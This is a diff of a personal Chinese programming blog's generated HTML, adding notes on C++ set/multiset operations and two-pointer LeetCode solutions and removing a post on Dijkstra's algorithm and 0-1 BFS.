+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 我的个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/05/16/%E8%AF%AD%E6%B3%95/C++/c++%20set/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-16 23:30:26" itemprop="dateCreated datePublished" datetime="2023-05-16T23:30:26+08:00">2023-05-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-20 10:27:07" itemprop="dateModified" datetime="2023-09-20T10:27:07+08:00">2023-09-20</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><h2 id="multiset"><a href="#multiset" class="headerlink" title="multiset"></a>multiset</h2><p><a href="https://blog.csdn.net/sodacoco/article/details/84798621">(41条消息) multiset用法总结_二喵君的博客-CSDN博客</a></p>
+<h2 id="常用函数总结："><a href="#常用函数总结：" class="headerlink" title="常用函数总结："></a>常用函数总结：</h2><p><strong>构造、拷贝、析构</strong></p>
+<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p><em>set</em>&nbsp;c</p></td><td><p>产生一个空的set/multiset，不含任何元素</p></td></tr><tr><td><p>set c(op)</p></td><td><p>以op为排序准则，产生一个空的set/multiset</p></td></tr><tr><td><p>set c1(c2)</p></td><td><p>产生某个set/multiset的副本，所有元素都被拷贝</p></td></tr><tr><td><p>set c(beg,end)</p></td><td><p>以区间[beg,end)内的所有元素产生一个set/multiset</p></td></tr><tr><td><p>set c(beg,end, op)</p></td><td><p>以op为排序准则，区间[beg,end)内的元素产生一个set/multiset</p></td></tr><tr><td><p>c.~set()</p></td><td><p>销毁所有元素，释放内存</p></td></tr><tr><td><p>set&lt;Elem&gt;</p></td><td><p>产生一个set，以(operator &lt;)为排序准则</p></td></tr><tr><td><p>set&lt;Elem,0p&gt;</p></td><td><p>产生一个set，以op为排序准则</p></td></tr></tbody></table>
+
+<h3 id="非变动性操作"><a href="#非变动性操作" class="headerlink" title="非变动性操作"></a><strong>非变动性操作</strong></h3><table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.size()</p></td><td><p>返回当前的元素数量</p></td></tr><tr><td><p>c.empty ()</p></td><td><p>判断大小是否为零，等同于0 == size()，效率更高</p></td></tr><tr><td><p>c.max_size()</p></td><td><p>返回能容纳的元素最大数量</p></td></tr><tr><td><p>c1 == c2</p></td><td><p>判断c1是否等于c2</p></td></tr><tr><td><p>c1 != c2</p></td><td><p>判断c1是否不等于c2(等同于!(c1==c2))</p></td></tr><tr><td><p>c1 &lt; c2</p></td><td><p>判断c1是否小于c2</p></td></tr><tr><td><p>c1 &gt; c2</p></td><td><p>判断c1是否大于c2</p></td></tr><tr><td><p>c1 &lt;= c2</p></td><td><p>判断c1是否小于等于c2(等同于!(c2&lt;c1))</p></td></tr><tr><td><p>c1 &gt;= c2</p></td><td><p>判断c1是否大于等于c2 (等同于!(c1&lt;c2))</p></td></tr></tbody></table>
+
+<h3 id="特殊的搜寻函数"><a href="#特殊的搜寻函数" class="headerlink" title="特殊的搜寻函数"></a><strong>特殊的搜寻函数</strong></h3><p>　　sets和multisets在元素快速搜寻方面做了优化设计，提供了特殊的搜寻函数，所以应优先使用这些搜寻函数，可获得对数复杂度，而非STL的线性复杂度。比如在1000个元素搜寻，对数复杂度平均十次，而线性复杂度平均需要500次。</p>
+<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>count (elem)</p></td><td><p>返回元素值为elem的个数</p></td></tr><tr><td><p>find(elem)</p></td><td><p>返回元素值为elem的第一个元素，如果没有返回end()</p></td></tr><tr><td><p>lower _bound(elem)</p></td><td><p>返回元素值为elem的第一个可安插位置，也就是元素值 &gt;= elem的第一个元素位置</p></td></tr><tr><td><p>upper _bound (elem)</p></td><td><p>返回元素值为elem的最后一个可安插位置，也就是元素值 &gt; elem 的第一个元素位置</p></td></tr><tr><td><p>equal_range (elem)</p></td><td><p>返回elem可安插的第一个位置和最后一个位置，也就是元素值==elem的区间</p></td></tr></tbody></table>
+
+<h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a><strong>赋值</strong></h3><table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c1 = c2</p></td><td><p>将c2的元素全部给c1</p></td></tr><tr><td><p>c1.swap(c2)</p></td><td><p>将c1和c2 的元素互换</p></td></tr><tr><td><p>swap(c1,c2)</p></td><td><p>同上，全局函数</p></td></tr></tbody></table>
+
+<h3 id="迭代器相关函数"><a href="#迭代器相关函数" class="headerlink" title="迭代器相关函数"></a><strong>迭代器相关函数</strong></h3><p>　　sets和multisets的迭代器是双向迭代器，对迭代器操作而言，所有的元素都被视为常数，可以确保你不会人为改变元素值，从而打乱既定顺序，所以无法调用变动性算法，如remove()。</p>
+<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.begin()</p></td><td><p>返回一个随机存取迭代器，指向第一个元素</p></td></tr><tr><td><p>c.end()</p></td><td><p>返回一个随机存取迭代器，指向最后一个元素的下一个位置</p></td></tr><tr><td><p>c.rbegin()</p></td><td><p>返回一个逆向迭代器，指向逆向迭代的第一个元素</p></td></tr><tr><td><p>c.rend()</p></td><td><p>返回一个逆向迭代器，指向逆向迭代的最后一个元素的下一个位置</p></td></tr></tbody></table>
+
+<h3 id="安插和删除元素"><a href="#安插和删除元素" class="headerlink" title="安插和删除元素"></a>安插和删除元素</h3><p>　　必须保证参数有效,迭代器必须指向有效位置，序列起点不能位于终点之后，不能从空容器删除元素。</p>
+<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.insert(elem)</p></td><td><p>插入一个elem副本，返回新元素位置，无论插入成功与否。</p></td></tr><tr><td><p>c.insert(pos, elem)</p></td><td><p>安插一个elem元素副本，返回新元素位置，pos为收索起点，提升插入速度。</p></td></tr><tr><td><p>c.insert(beg,end)</p></td><td><p>将区间[beg,end)所有的元素安插到c，无返回值。</p></td></tr><tr><td><p>c.erase(elem)</p></td><td><p>删除与elem相等的所有元素，返回被移除的元素个数。</p></td></tr><tr><td><p>c.erase(pos)</p></td><td><p>移除迭代器pos所指位置元素，无返回值。</p></td></tr><tr><td><p>c.erase(beg,end)</p></td><td><p>移除区间[beg,end)所有元素，无返回值。</p></td></tr><tr><td><p>c.clear()</p></td><td><p>移除所有元素，将容器清空</p></td></tr></tbody></table>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/05/09/%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Destiny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+      <meta itemprop="description" content="凡是过去，皆为序章。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 我的个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/05/09/%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-09 21:16:57" itemprop="dateCreated datePublished" datetime="2023-05-09T21:16:57+08:00">2023-05-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-08 16:10:10" itemprop="dateModified" datetime="2024-03-08T16:10:10+08:00">2024-03-08</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><h1 id="区间指针"><a href="#区间指针" class="headerlink" title="区间指针"></a>区间指针</h1><h2 id="分组循环"><a href="#分组循环" class="headerlink" title="分组循环"></a>分组循环</h2><blockquote>
+<p>查找符合条件的区间，寻找左右边界</p>
+</blockquote>
+<h4 id="2765-最长交替子序列"><a href="#2765-最长交替子序列" class="headerlink" title="2765. 最长交替子序列"></a><a href="https://leetcode.cn/problems/longest-alternating-subarray/">2765. 最长交替子序列</a></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">alternatingSubarray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;  </span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 分组循环，外层循环枚举起点，内层循环扩展右侧边界</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i+<span class="number">1</span>]-nums[i]!=<span class="number">1</span>)&#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> left=i; <span class="comment">//记录左端点</span></span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;n&amp;&amp;nums[i]==nums[left+(i-left)%<span class="number">2</span>])</span><br><span class="line">                i++;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,i-left);</span><br><span class="line">            i--;        <span class="comment">//回退到上一个区间最后一个位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="6900-统计完全子数组的数目"><a href="#6900-统计完全子数组的数目" class="headerlink" title="6900. 统计完全子数组的数目"></a><a href="https://leetcode.cn/problems/count-complete-subarrays-in-an-array/">6900. 统计完全子数组的数目</a></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countCompleteSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">record</span><span class="params">(nums.begin(),nums.end())</span></span>;</span><br><span class="line">        <span class="type">int</span> m=record.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;        <span class="comment">//记录每个数字出现的个数</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,ans=<span class="number">0</span>,n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//枚举右端点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> right=<span class="number">0</span>;right&lt;n;right++)&#123;</span><br><span class="line">            cnt[nums[right]]++;</span><br><span class="line">            <span class="keyword">while</span>(cnt.<span class="built_in">size</span>()==m)&#123;</span><br><span class="line">                <span class="type">int</span> x=nums[left++];</span><br><span class="line">                <span class="keyword">if</span>(--cnt[x]==<span class="number">0</span>)</span><br><span class="line">                    cnt.<span class="built_in">erase</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">            ans+=left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h1><h2 id="floyd判圈"><a href="#floyd判圈" class="headerlink" title="floyd判圈"></a>floyd判圈</h2><p> <a href="https://leetcode.cn/problems/palindrome-linked-list/">234. 回文链表</a></p>
+<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112241057961.png" alt="image-20211224105728916" style="zoom: 50%;" />
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112241135413.png" alt="image-20211224113536339"></p>
 <ul>
-<li><p>时间复杂度$O(n^2+m)$，求未访问的距离最近节点O(n)，总共n个节点，m条边</p>
+<li><p>从链表第一个节点开始<br>$$<br>\begin{aligned}<br>r为环的长度，n为圈数 \<br>2(a+x-1)&#x3D;(a-1)+n\times r+x \<br>a&#x3D;n\times r -x+1<br>\end{aligned}<br>$$</p>
 </li>
-<li><p>空间复杂度：$O(n^2)$</p>
-</li>
+<li><p>从头节点（不存储数据）开始<br>$$<br>  \begin{aligned}<br>r为环的长度，n为圈数 \<br>2(a+x)&#x3D;a+n\times r+x \<br>a&#x3D;n\times r -x<br>\end{aligned}<br>$$</p>
+<p>slow，fast初始时指向同一个位置，而终止条件也是指向同一个位置，因此采用do—while循环比较好</p>
+<p>fast遇到null停止，将判断相遇放到循环里</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// 找到相遇点z （对应上图）</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="literal">null</span> || fast.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 想到 cycle起点y （对应上图）</span></span><br><span class="line">        slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != slow) &#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>邻接表存储：</p>
-<ul>
-<li>时间复杂度：$O(n^2+m)$</li>
-<li>空间复杂度：$O(n+m)$</li>
-</ul>
-<p>堆优化：（采用邻接表存储，堆优化是寻找最近未被访问节点）</p>
-<ul>
-<li>时间复杂度：$O(mlogm)$</li>
-<li>空间复杂度：$O(n+m)$</li>
-</ul>
-<p>稠密图(边数远大于点数)，运行时间上，枚举写法要略快于堆的写法。</p>
-<h3 id="a-邻接矩阵存储"><a href="#a-邻接矩阵存储" class="headerlink" title="a. 邻接矩阵存储"></a>a. 邻接矩阵存储</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        graph[from][to]=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    <span class="comment">//记录点i是否被访问过</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n,<span class="literal">false</span>)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//需要求到其余n-1个点的距离</span></span><br><span class="line">  	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="comment">//寻找未访问的最近的结点</span></span><br><span class="line">        <span class="type">int</span> u=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j]&amp;&amp;(u==<span class="number">-1</span>||dist[j]&lt;dist[u]))</span><br><span class="line">                u=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//存在节点不可达的情况</span></span><br><span class="line">        <span class="keyword">if</span>(dist[u]==INT_MAX)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//遍历u结点的临边</span></span><br><span class="line">        <span class="comment">//可以将不存在的边初始化为一个较大的值，这样在这里不需要判断是否存在边</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(graph[u][k]!=<span class="number">-1</span>)</span><br><span class="line">                dist[k]=<span class="built_in">min</span>(dist[k],dist[u]+graph[u][k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="b-邻接表存储"><a href="#b-邻接表存储" class="headerlink" title="b. 邻接表存储"></a>b. 邻接表存储</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        g[from].<span class="built_in">push_back</span>(&#123;to,weight&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    <span class="comment">//记录点i是否被访问过</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n,<span class="literal">false</span>)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//需要求到其余n-1个点的距离</span></span><br><span class="line">  	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="comment">//寻找未访问的最近的结点</span></span><br><span class="line">        <span class="type">int</span> u=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j]&amp;&amp;(u==<span class="number">-1</span>||dist[j]&lt;dist[u]))</span><br><span class="line">                u=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//存在节点不可达的情况</span></span><br><span class="line">        <span class="keyword">if</span>(dist[u]==INT_MAX)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//遍历u结点的临边</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;[v,w]:graph[u])&#123;</span><br><span class="line">            dis[v]=<span class="built_in">min</span>(dis[v],dis[u]+w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="c-堆优化的Dijkstra算法"><a href="#c-堆优化的Dijkstra算法" class="headerlink" title="c. 堆优化的Dijkstra算法"></a>c. 堆优化的Dijkstra算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        g[from].<span class="built_in">push_back</span>(&#123;to,weight&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">	priority_queue&lt;pii,vector&lt;pii&gt;,greater&lt;&gt;&gt; pq;</span><br><span class="line">    pq.<span class="built_in">push</span>(&#123;<span class="number">0</span>,src&#125;);</span><br><span class="line">    </span><br><span class="line">   	<span class="keyword">while</span>(!pq.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> [cost,u]=pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// 下图红色部分给出了说明</span></span><br><span class="line">        <span class="keyword">if</span>(dis[u]&lt;cost)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;[v,w]:g[u])&#123;</span><br><span class="line">            <span class="type">int</span> d=dis[u]+w;</span><br><span class="line">            <span class="keyword">if</span>(d&lt;dis[v])&#123;</span><br><span class="line">                dis[v]=d;</span><br><span class="line">                pq.<span class="built_in">push</span>(&#123;d,v&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202304192049047.png" alt="image-20230419204952947"></p>
-<h2 id="2-0-1-BFS"><a href="#2-0-1-BFS" class="headerlink" title="2. 0-1 BFS"></a>2. 0-1 BFS</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> inf = INT_MAX / <span class="number">2</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dis</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, inf));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">vis</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        deque&lt;<span class="type">int</span>&gt; dq;</span><br><span class="line"></span><br><span class="line">        dis[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dq.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!dq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> node = dq.<span class="built_in">front</span>();</span><br><span class="line">            dq.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> x = node / n, y = node % n;</span><br><span class="line">            <span class="keyword">if</span> (vis[x][y]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            vis[x][y] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="type">int</span> p = x + direction[k][<span class="number">0</span>], q = y + direction[k][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (p &gt;= <span class="number">0</span> &amp;&amp; p &lt; m &amp;&amp; q &gt;= <span class="number">0</span> &amp;&amp; q &lt; n) &#123;</span><br><span class="line">                    <span class="type">int</span> newD = dis[x][y] + (k + <span class="number">1</span> != grid[x][y]);</span><br><span class="line">                    <span class="keyword">if</span> (newD &lt; dis[p][q]) &#123;</span><br><span class="line">                        dis[p][q] = newD;</span><br><span class="line">                        <span class="keyword">if</span> (grid[x][y] == k + <span class="number">1</span>) &#123;</span><br><span class="line">                            dq.<span class="built_in">push_front</span>(p * n + q);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            dq.<span class="built_in">push_back</span>(p * n + q);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dis[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
